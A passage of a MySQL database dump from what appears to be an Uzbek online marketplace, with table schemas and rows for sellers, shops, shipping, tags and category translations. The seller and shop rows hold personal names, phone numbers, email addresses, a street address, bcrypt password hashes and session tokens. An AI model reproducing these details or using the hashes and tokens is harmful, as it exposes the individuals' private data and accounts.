(1,'Muhiddin','Kabraliev','+998905650213','2025-06-24-685a19ce2c331.webp','kabraliev2005@gmail.com','$2y$10$cLF/YBm/25nHRg2GyCRl1.vwxtZrB6aOgiWoaxLQmNnNUfQq.POMG','suspended',NULL,'2025-06-24 09:21:50','2025-06-29 12:46:20',NULL,NULL,NULL,NULL,'nBZZ0yJMnCuvGwtuz7pMxqoo1bigLrXcbkNaBbFf91qHxmdG4pfoiMFEIKcgTgMNevvcHVaer4lCN86R',NULL,NULL,NULL,0,0.00,0,0.00,'en'),
(2,'Murod','Abdujamilov','+998901230001','2025-06-29-6860ed00e3ad8.webp','future-1@gmail.com','$2y$10$NtyGRkH9hYnvbH1cGpGoee70CWRLCicSaJsySeuY8LUbQI8JEdIVu','approved','qUaL3oi5WPzxWg7I9UEJCJIm2nMm0DJgNea31As35BkMu84QiMhro5HIlim7','2025-06-29 12:36:33','2025-06-29 12:36:33',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0.00,0,0.00,'en'),
(3,'Murod','Abdujamilov','+998901230002','2025-06-29-6860ee5721dc1.webp','future-2@gmail.com','$2y$10$Yj2ZEVmJ4404TRQHBOwxwO6Dd1GhZc7BE0EWEcbHkuN/wJxNAg/ou','approved','oh8h8aKsIrpw0hDzXDUq8DO2XGnEHgp1rzOC0aWcUs54ktY7Qv2swUSI3ejV','2025-06-29 12:42:15','2025-06-29 12:42:15',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0.00,0,0.00,'en');
/*!40000 ALTER TABLE `sellers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `shipping_addresses`
--

DROP TABLE IF EXISTS `shipping_addresses`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `shipping_addresses` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `customer_id` varchar(15) DEFAULT NULL,
  `is_guest` tinyint(4) NOT NULL DEFAULT 0,
  `contact_person_name` varchar(50) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `address_type` varchar(20) NOT NULL DEFAULT 'home',
  `address` varchar(255) DEFAULT NULL,
  `city` varchar(50) DEFAULT NULL,
  `zip` varchar(10) DEFAULT NULL,
  `phone` varchar(20) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `state` varchar(191) DEFAULT NULL,
  `country` varchar(191) DEFAULT NULL,
  `latitude` varchar(191) DEFAULT NULL,
  `longitude` varchar(191) DEFAULT NULL,
  `is_billing` tinyint(1) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `shipping_addresses`
--

LOCK TABLES `shipping_addresses` WRITE;
/*!40000 ALTER TABLE `shipping_addresses` DISABLE KEYS */;
INSERT INTO `shipping_addresses` VALUES
(1,'0',0,'fdsfdsaf',NULL,'permanent','fdsafdsf','Tashkent','150300','+998888112309',NULL,NULL,NULL,'Uzbekistan','-33.8688','151.2195',0),
(2,'0',0,'Salom',NULL,'permanent','dsfsdaf','Tashkent','150300','+998888112309',NULL,NULL,NULL,'Uzbekistan','-33.8688','151.2195',1);
/*!40000 ALTER TABLE `shipping_addresses` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `shipping_methods`
--

DROP TABLE IF EXISTS `shipping_methods`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `shipping_methods` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `creator_id` bigint(20) DEFAULT NULL,
  `creator_type` varchar(191) NOT NULL DEFAULT 'admin',
  `title` varchar(100) DEFAULT NULL,
  `cost` decimal(8,2) NOT NULL DEFAULT 0.00,
  `duration` varchar(20) DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `shipping_methods`
--

LOCK TABLES `shipping_methods` WRITE;
/*!40000 ALTER TABLE `shipping_methods` DISABLE KEYS */;
INSERT INTO `shipping_methods` VALUES
(2,1,'admin','Company Vehicle',5.00,'2 Week',1,'2021-05-25 20:57:04','2021-05-25 20:57:04'),
(9,1,'admin','Test shipping',30000.00,'2',1,'2025-06-27 14:07:34','2025-06-27 14:07:34');
/*!40000 ALTER TABLE `shipping_methods` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `shipping_types`
--

DROP TABLE IF EXISTS `shipping_types`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `shipping_types` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `seller_id` bigint(20) unsigned DEFAULT NULL,
  `shipping_type` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `shipping_types`
--

LOCK TABLES `shipping_types` WRITE;
/*!40000 ALTER TABLE `shipping_types` DISABLE KEYS */;
INSERT INTO `shipping_types` VALUES
(1,0,'order_wise','2025-06-23 22:36:57','2025-06-23 22:36:57');
/*!40000 ALTER TABLE `shipping_types` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `shop_followers`
--

DROP TABLE IF EXISTS `shop_followers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `shop_followers` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `shop_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL COMMENT 'Customer ID',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `shop_followers`
--

LOCK TABLES `shop_followers` WRITE;
/*!40000 ALTER TABLE `shop_followers` DISABLE KEYS */;
/*!40000 ALTER TABLE `shop_followers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `shops`
--

DROP TABLE IF EXISTS `shops`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `shops` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `seller_id` bigint(20) NOT NULL,
  `name` varchar(100) NOT NULL,
  `slug` varchar(191) NOT NULL DEFAULT 'en',
  `address` varchar(255) NOT NULL,
  `contact` varchar(25) NOT NULL,
  `image` varchar(30) NOT NULL DEFAULT 'def.png',
  `image_storage_type` varchar(10) DEFAULT 'public',
  `bottom_banner` varchar(191) DEFAULT NULL,
  `bottom_banner_storage_type` varchar(10) DEFAULT 'public',
  `offer_banner` varchar(255) DEFAULT NULL,
  `offer_banner_storage_type` varchar(10) DEFAULT 'public',
  `vacation_start_date` date DEFAULT NULL,
  `vacation_end_date` date DEFAULT NULL,
  `vacation_note` varchar(255) DEFAULT NULL,
  `vacation_status` tinyint(4) NOT NULL DEFAULT 0,
  `temporary_close` tinyint(4) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `banner` varchar(191) NOT NULL,
  `banner_storage_type` varchar(10) DEFAULT 'public',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `shops`
--

LOCK TABLES `shops` WRITE;
/*!40000 ALTER TABLE `shops` DISABLE KEYS */;
INSERT INTO `shops` VALUES
(1,1,'Kumo','kumo-OhA35p','Beshariq\r\nBeshariq','+998905650213','2025-06-24-685a19ce7fda1.webp','public','def.png','public',NULL,'public',NULL,NULL,NULL,0,0,'2025-06-24 09:21:50','2025-06-24 09:21:50','2025-06-24-685a19ce9c30f.webp','public'),
(2,2,'FUTURE - IT','future-it-o2BCW1','г.Ташкент Учтпинский район кв 22 д 2 кв.31','+998901230001','2025-06-29-6860ed0142b17.webp','public','def.png','public',NULL,'public',NULL,NULL,NULL,0,0,'2025-06-29 12:36:33','2025-06-29 12:36:33','2025-06-29-6860ed0163f4f.webp','public'),
(3,3,'FUTURE - IT','future-it-zP2Zu0','г.Ташкент Учтпинский район кв 22 д 2 кв.31','+998901230002','2025-06-29-6860ee5772b06.webp','public','def.png','public',NULL,'public',NULL,NULL,NULL,0,0,'2025-06-29 12:42:15','2025-06-29 12:42:15','2025-06-29-6860ee578de6c.webp','public');
/*!40000 ALTER TABLE `shops` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `social_medias`
--

DROP TABLE IF EXISTS `social_medias`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `social_medias` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `link` varchar(100) NOT NULL,
  `icon` varchar(100) DEFAULT NULL,
  `active_status` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `social_medias`
--

LOCK TABLES `social_medias` WRITE;
/*!40000 ALTER TABLE `social_medias` DISABLE KEYS */;
INSERT INTO `social_medias` VALUES
(1,'twitter','https://www.w3schools.com/howto/howto_css_table_responsive.asp','fa fa-twitter',1,1,'2020-12-31 21:18:03','2020-12-31 21:18:25'),
(2,'linkedin','https://dev.6amtech.com/','fa fa-linkedin',1,1,'2021-02-27 16:23:01','2021-02-27 16:23:05'),
(3,'google-plus','https://dev.6amtech.com/','fa fa-google-plus-square',1,1,'2021-02-27 16:23:30','2021-02-27 16:23:33'),
(4,'pinterest','https://dev.6amtech.com/','fa fa-pinterest',1,1,'2021-02-27 16:24:14','2021-02-27 16:24:26'),
(5,'instagram','https://dev.6amtech.com/','fa fa-instagram',1,1,'2021-02-27 16:24:36','2021-02-27 16:24:41'),
(6,'facebook','facebook.com','fa fa-facebook',1,1,'2021-02-27 19:19:42','2021-06-11 17:41:59');
/*!40000 ALTER TABLE `social_medias` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `soft_credentials`
--

DROP TABLE IF EXISTS `soft_credentials`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `soft_credentials` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `key` varchar(191) DEFAULT NULL,
  `value` longtext DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `soft_credentials`
--

LOCK TABLES `soft_credentials` WRITE;
/*!40000 ALTER TABLE `soft_credentials` DISABLE KEYS */;
/*!40000 ALTER TABLE `soft_credentials` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `stock_clearance_products`
--

DROP TABLE IF EXISTS `stock_clearance_products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `stock_clearance_products` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `added_by` varchar(255) NOT NULL,
  `product_id` int(11) DEFAULT NULL,
  `setup_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `shop_id` int(11) DEFAULT NULL,
  `is_active` tinyint(1) NOT NULL DEFAULT 0,
  `discount_type` varchar(255) DEFAULT 'percentage',
  `discount_amount` decimal(18,12) NOT NULL DEFAULT 0.000000000000,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `stock_clearance_products`
--

LOCK TABLES `stock_clearance_products` WRITE;
/*!40000 ALTER TABLE `stock_clearance_products` DISABLE KEYS */;
/*!40000 ALTER TABLE `stock_clearance_products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `stock_clearance_setups`
--

DROP TABLE IF EXISTS `stock_clearance_setups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `stock_clearance_setups` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `setup_by` varchar(255) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `shop_id` int(11) DEFAULT NULL,
  `is_active` tinyint(1) NOT NULL DEFAULT 0,
  `discount_type` varchar(255) DEFAULT 'percentage',
  `discount_amount` decimal(18,12) NOT NULL DEFAULT 0.000000000000,
  `offer_active_time` varchar(255) DEFAULT NULL,
  `offer_active_range_start` time DEFAULT NULL,
  `offer_active_range_end` time DEFAULT NULL,
  `show_in_homepage` tinyint(1) NOT NULL DEFAULT 0,
  `show_in_homepage_once` tinyint(1) NOT NULL DEFAULT 0,
  `show_in_shop` tinyint(1) NOT NULL DEFAULT 1,
  `duration_start_date` timestamp NULL DEFAULT NULL,
  `duration_end_date` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `stock_clearance_setups`
--

LOCK TABLES `stock_clearance_setups` WRITE;
/*!40000 ALTER TABLE `stock_clearance_setups` DISABLE KEYS */;
/*!40000 ALTER TABLE `stock_clearance_setups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `storages`
--

DROP TABLE IF EXISTS `storages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `storages` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `data_type` varchar(255) NOT NULL,
  `data_id` varchar(100) NOT NULL,
  `key` varchar(255) DEFAULT NULL,
  `value` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `storages_data_id_index` (`data_id`),
  KEY `storages_value_index` (`value`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `storages`
--

LOCK TABLES `storages` WRITE;
/*!40000 ALTER TABLE `storages` DISABLE KEYS */;
INSERT INTO `storages` VALUES
(1,'App\\Models\\Seller','1','image','public','2025-06-24 09:21:50','2025-06-24 09:21:50'),
(2,'App\\Models\\Seller','2','image','public','2025-06-29 12:36:33','2025-06-29 12:36:33'),
(3,'App\\Models\\Seller','3','image','public','2025-06-29 12:42:15','2025-06-29 12:42:15'),
(4,'App\\Models\\ProductSeo','1','image','public','2025-07-04 01:28:22','2025-07-04 01:28:22'),
(5,'App\\Models\\ProductSeo','2','image','public','2025-07-04 02:34:25','2025-07-04 02:34:25'),
(6,'App\\Models\\ProductSeo','3','image','public','2025-07-07 15:11:35','2025-07-07 15:11:35'),
(7,'App\\Models\\DeliveryMan','1','image','public','2025-07-11 23:05:10','2025-07-11 23:05:10');
/*!40000 ALTER TABLE `storages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `subscriptions`
--

DROP TABLE IF EXISTS `subscriptions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `subscriptions` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `email` varchar(191) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `subscriptions`
--

LOCK TABLES `subscriptions` WRITE;
/*!40000 ALTER TABLE `subscriptions` DISABLE KEYS */;
/*!40000 ALTER TABLE `subscriptions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `support_ticket_convs`
--

DROP TABLE IF EXISTS `support_ticket_convs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `support_ticket_convs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `support_ticket_id` bigint(20) DEFAULT NULL,
  `admin_id` bigint(20) DEFAULT NULL,
  `customer_message` varchar(191) DEFAULT NULL,
  `attachment` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`attachment`)),
  `admin_message` varchar(191) DEFAULT NULL,
  `position` int(11) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `support_ticket_convs`
--

LOCK TABLES `support_ticket_convs` WRITE;
/*!40000 ALTER TABLE `support_ticket_convs` DISABLE KEYS */;
/*!40000 ALTER TABLE `support_ticket_convs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `support_tickets`
--

DROP TABLE IF EXISTS `support_tickets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `support_tickets` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `customer_id` bigint(20) DEFAULT NULL,
  `subject` varchar(150) DEFAULT NULL,
  `type` varchar(50) DEFAULT NULL,
  `priority` varchar(15) NOT NULL DEFAULT 'low',
  `description` varchar(255) DEFAULT NULL,
  `attachment` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`attachment`)),
  `reply` varchar(255) DEFAULT NULL,
  `status` varchar(15) NOT NULL DEFAULT 'open',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `support_tickets`
--

LOCK TABLES `support_tickets` WRITE;
/*!40000 ALTER TABLE `support_tickets` DISABLE KEYS */;
/*!40000 ALTER TABLE `support_tickets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tags`
--

DROP TABLE IF EXISTS `tags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `tags` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `tag` varchar(191) NOT NULL,
  `visit_count` bigint(20) unsigned NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tags`
--

LOCK TABLES `tags` WRITE;
/*!40000 ALTER TABLE `tags` DISABLE KEYS */;
INSERT INTO `tags` VALUES
(1,'ss',0,'2025-07-04 01:28:21','2025-07-04 01:28:21'),
(2,'telephone',0,'2025-07-04 02:34:23','2025-07-04 02:34:23'),
(3,'iphone',0,'2025-07-04 02:34:23','2025-07-04 02:34:23'),
(4,'apple',0,'2025-07-04 02:34:23','2025-07-04 02:34:23'),
(5,'telefon',0,'2025-07-07 15:11:34','2025-07-07 15:11:34');
/*!40000 ALTER TABLE `tags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `transactions`
--

DROP TABLE IF EXISTS `transactions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `transactions` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint(20) DEFAULT NULL,
  `payment_for` varchar(100) DEFAULT NULL,
  `payer_id` bigint(20) DEFAULT NULL,
  `payment_receiver_id` bigint(20) DEFAULT NULL,
  `paid_by` varchar(15) DEFAULT NULL,
  `paid_to` varchar(15) DEFAULT NULL,
  `payment_method` varchar(15) DEFAULT NULL,
  `payment_status` varchar(10) NOT NULL DEFAULT 'success',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `amount` double(8,2) NOT NULL DEFAULT 0.00,
  `transaction_type` varchar(191) DEFAULT NULL,
  `order_details_id` bigint(20) unsigned DEFAULT NULL,
  UNIQUE KEY `transactions_id_unique` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `transactions`
--

LOCK TABLES `transactions` WRITE;
/*!40000 ALTER TABLE `transactions` DISABLE KEYS */;
/*!40000 ALTER TABLE `transactions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `translations`
--

DROP TABLE IF EXISTS `translations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `translations` (
  `translationable_type` varchar(191) NOT NULL,
  `translationable_id` bigint(20) unsigned NOT NULL,
  `locale` varchar(191) NOT NULL,
  `key` varchar(191) DEFAULT NULL,
  `value` text DEFAULT NULL,
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`),
  KEY `translations_translationable_id_index` (`translationable_id`),
  KEY `translations_locale_index` (`locale`)
) ENGINE=InnoDB AUTO_INCREMENT=71 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `translations`
--

LOCK TABLES `translations` WRITE;
/*!40000 ALTER TABLE `translations` DISABLE KEYS */;
INSERT INTO `translations` VALUES
('App\\Models\\Category',1,'uz','name','Smartfonlar va gadjetlar',1),
('App\\Models\\Category',1,'ru','name','Смартфоны и гаджеты',2),
('App\\Models\\Category',2,'uz','name','Noutbuklar va kompyuterlar',3),
('App\\Models\\Category',2,'ru','name','Ноутбуки и компьютеры',4),
('App\\Models\\Category',3,'uz','name','Televizorlar va raqamli TV',5),
('App\\Models\\Category',3,'ru','name','Телевизоры и цифровое ТВ',6),
('App\\Models\\Category',4,'uz','name','Oshxona texnikasi',7),
('App\\Models\\Category',4,'ru','name','Техника для кухни',8),
('App\\Models\\Category',5,'uz','name','Uy uchun texnika',9),
('App\\Models\\Category',5,'ru','name','Техника для дома',10),
('App\\Models\\Category',6,'uz','name','Go\'zallik va salomatlik',11),
('App\\Models\\Category',6,'ru','name','Красота и здоровье',12),
('App\\Models\\Category',7,'uz','name','O\'yinlar va dasturlar',13),
('App\\Models\\Category',7,'ru','name','Игры и софт',14),
('App\\Models\\Category',19,'uz','name','Smartfonlar',35),
('App\\Models\\Category',19,'ru','name','Смартфоны',36),
('App\\Models\\Category',20,'uz','name','Planshetlar',37),
('App\\Models\\Category',20,'ru','name','Планшеты',38),
('App\\Models\\Category',21,'uz','name','Aqlli soatlar va fitnes bilaguzuklar',39),
('App\\Models\\Category',21,'ru','name','Умные часы и фитнес-браслеты',40),
('App\\Models\\Category',22,'uz','name','Noutbuklar',41),
('App\\Models\\Category',22,'ru','name','Ноутбуки',42),
('App\\Models\\Category',23,'uz','name','Kompyuterlar va monobloklar',43),
('App\\Models\\Category',23,'ru','name','Компьютеры и моноблоки',44),
('App\\Models\\Category',24,'uz','name','Kompyuter butlovchi qismlari',45),
('App\\Models\\Category',24,'ru','name','Комплектующие для ПК',46),
('App\\Models\\Category',25,'uz','name','Printerlar va ko\'p funksiyali qurilmalar',47),
('App\\Models\\Category',25,'ru','name','Принтеры и МФУ',48),
('App\\Models\\Category',26,'uz','name','Televizorlar',49),
('App\\Models\\Category',26,'ru','name','Телевизоры',50),
('App\\Models\\Category',27,'uz','name','Uy kinoteatrlari va saundbarlar',51),
('App\\Models\\Category',27,'ru','name','Домашние кинотеатры и саундбары',52),
('App\\Models\\Category',28,'uz','name','TV uchun aksessuarlar',53),
('App\\Models\\Category',28,'ru','name','Аксессуары для ТВ',54),
('App\\Models\\Category',29,'uz','name','Muzlatgichlar',55),
('App\\Models\\Category',29,'ru','name','Холодильники',56),
('App\\Models\\Category',30,'uz','name','Mikroto\'lqinli pechlar',57),
('App\\Models\\Category',30,'ru','name','Микроволновые печи',58),
('App\\Models\\Category',31,'uz','name','Kofe mashinalari va kofe qaynatgichlar',59),
('App\\Models\\Category',31,'ru','name','Кофемашины и кофеварки',60),
('App\\Models\\Category',32,'uz','name','Blenderlar va mikserlar',61),
('App\\Models\\Category',32,'ru','name','Блендеры и миксеры',62),
('App\\Models\\Category',33,'uz','name','Kir yuvish mashinalari',63),
('App\\Models\\Category',33,'ru','name','Стиральные машины',64),
('App\\Models\\Category',34,'uz','name','Changyutgichlar',65),
('App\\Models\\Category',34,'ru','name','Пылесосы',66),
('App\\Models\\Category',35,'uz','name','Dazmollar',67),
('App\\Models\\Category',35,'ru','name','Утюги',68),
('App\\Models\\Category',36,'uz','name','Soch quritgichlar (fenlar) va staylerlar',69),
('App\\Models\\Category',36,'ru','name','Фены и стайлеры',70);
/*!40000 ALTER TABLE `translations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(80) DEFAULT NULL,
  `f_name` varchar(255) DEFAULT NULL,
  `l_name` varchar(255) DEFAULT NULL,
  `phone` varchar(25) NOT NULL,
  `image` varchar(30) NOT NULL DEFAULT 'def.png',
  `email` varchar(255) DEFAULT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(80) NOT NULL,
  `remember_token` varchar(100) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `street_address` varchar(250) DEFAULT NULL,
  `country` varchar(50) DEFAULT NULL,
  `city` varchar(50) DEFAULT NULL,
  `zip` varchar(20) DEFAULT NULL,
  `house_no` varchar(50) DEFAULT NULL,
  `apartment_no` varchar(50) DEFAULT NULL,
  `cm_firebase_token` varchar(191) DEFAULT NULL,
  `is_active` tinyint(1) NOT NULL DEFAULT 1,
  `payment_card_last_four` varchar(191) DEFAULT NULL,
  `payment_card_brand` varchar(191) DEFAULT NULL,
  `payment_card_fawry_token` text DEFAULT NULL,
  `login_medium` varchar(191) DEFAULT NULL,
  `social_id` varchar(191) DEFAULT NULL,
  `is_phone_verified` tinyint(1) NOT NULL DEFAULT 0,
  `temporary_token` varchar(191) DEFAULT NULL,
  `is_email_verified` tinyint(1) NOT NULL DEFAULT 0,
  `wallet_balance` double(8,2) DEFAULT NULL,
  `loyalty_point` decimal(18,4) DEFAULT 0.0000,
  `login_hit_count` tinyint(4) NOT NULL DEFAULT 0,
  `is_temp_blocked` tinyint(1) NOT NULL DEFAULT 0,
  `temp_block_time` timestamp NULL DEFAULT NULL,
  `referral_code` varchar(255) DEFAULT NULL,
  `referred_by` int(11) DEFAULT NULL,
  `app_language` varchar(191) NOT NULL DEFAULT 'en',
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES
